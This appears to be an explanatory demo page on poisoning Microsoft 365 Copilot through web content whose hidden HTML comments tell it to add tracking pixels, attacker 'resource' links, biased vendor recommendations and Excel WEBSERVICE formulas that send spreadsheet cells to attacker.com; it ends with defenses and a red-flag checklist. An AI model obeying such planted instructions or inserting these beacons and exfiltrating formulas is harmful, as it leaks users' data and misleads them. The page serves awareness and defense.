📊 Microsoft 365 Copilot Poisoning Demo

The Attack Scenario

Microsoft 365 Copilot (Word, Excel, PowerPoint, Outlook) performs web research to help create content. Unlike code-execution attacks, M365 Copilot can't run arbitrary code. Instead, attacks focus on:

  • Content Manipulation - Inserting biased or false information
  • Tracking & Exfiltration - Image beacons, external references
  • Link Injection - Malicious URLs disguised as resources
  • Social Engineering - Phishing emails, malicious recommendations

Attack Flow: Document Generation

Step 1: User asks Copilot in Word
"Create a marketing strategy document for Q1 2024"
Step 2: Copilot searches web for marketing content
Finds poisoned "2024 Marketing Strategy Guide"
Step 3: Copilot reads hidden instructions
HTML comments tell it to include tracking links and recommend specific tools
Step 4: Copilot generates document with poisoned content
Includes tracking pixels, biased recommendations, malicious links
Step 5: User reviews, looks good, shares document
Professional content, doesn't notice external references
Step 6: Data exfiltration begins
Document opens tracked, links clicked, spreadsheet data sent to attacker

Data Exfiltration Methods (No Code Execution)

1. Tracking Pixels in Documents

<!-- Inserted into Word document by Copilot --> <img src="https://track.attacker.com/pixel?doc=UNIQUE_ID&user=EMAIL">

Exfiltrates: When document opened, user email, company domain

2. Malicious "Resource" Links

For more information, see: - [Industry Report](https://attacker.com/collect?topic=QUERY&company=TARGET) - [Best Practices](https://malicious.site/harvest?source=copilot)

Exfiltrates: Research topics, company info, credentials when clicked

3. External Data Connections (Excel)

=WEBSERVICE("https://attacker.com/api?data=" & A1 & "&company=" & B1)

Exfiltrates: Spreadsheet data when formula recalculates

4. Email Tracking (Outlook)

<!-- In email signature --> <img src="https://track.email.io/open?id=UNIQUE_ID" height="1" width="1">

Exfiltrates: Email opens, recipient info, click behavior

Example Attack: Marketing Document

User Request: "Create a Q1 marketing strategy document"

Copilot Action: Searches web → finds poisoned guide → reads instructions

Generated Document Includes:

  • 📸 Tracking image: <img src="https://track.metrics.io/pixel?doc=Q1_STRATEGY">
  • 🔗 "Resource" link: https://attacker.com/collect?company=TARGET
  • 🎯 Biased recommendation: "Use MarketMetrics Pro (attacker's tool)"
  • 📊 Excel formula: =WEBSERVICE("https://attacker.com/data?...")

User Impact:

  • ✗ Document looks professional, user shares with team
  • ✗ Tracking pixel reveals who opened it, when, from where
  • ✗ Link clicks harvest credentials from team members
  • ✗ Company implements biased recommendations
  • ✗ Spreadsheet formulas exfiltrate financial data

All achieved without executing any code - just poisoned content.

🛡️ Defense Strategies

For M365 Administrators:

  • Content Source Restrictions: Limit domains Copilot can access
  • Block External Images: Disable auto-loading in documents
  • Link Scanning: Check all URLs against threat intelligence
  • External Data Blocking: Restrict WEBSERVICE() and external connections
  • Output Monitoring: Log and flag suspicious Copilot content

For Users:

  • Review All Content: Don't blindly trust Copilot output
  • Remove External References: Delete tracking images before sharing
  • Verify Links: Check URLs before clicking
  • Check Sources: See where Copilot got information from
  • Sanitize Before Sharing: Remove external content from sensitive docs

Detection Checklist

🚩 Red Flags in Copilot-Generated Content:

  • Excessive external links to unfamiliar domains
  • References to obscure tools or vendors
  • "Download" or "click here to verify" language
  • Embedded images from unknown domains
  • Excel formulas with WEBSERVICE() to external sites
  • Overly specific recommendations without explanation
  • Tracking parameters in URLs (?id=, ?user=, ?source=)

Key Differences from Code-Execution Attacks

Attack Vector Code Execution M365 Copilot
Method Run malicious code Content manipulation
Exfiltration Direct API calls Tracking pixels, links
Detection Code analysis Content review
Scale Per execution Per document shared

Key Takeaways

  • 🎯 M365 Copilot can't execute code - but content attacks are still dangerous
  • 📡 Exfiltration via documents - tracking pixels and external references
  • 🔗 Social engineering at scale - AI amplifies attacker reach
  • 👀 Always review Copilot output - check links, images, recommendations
  • 🛡️ Multiple defense layers needed - technical controls + user awareness
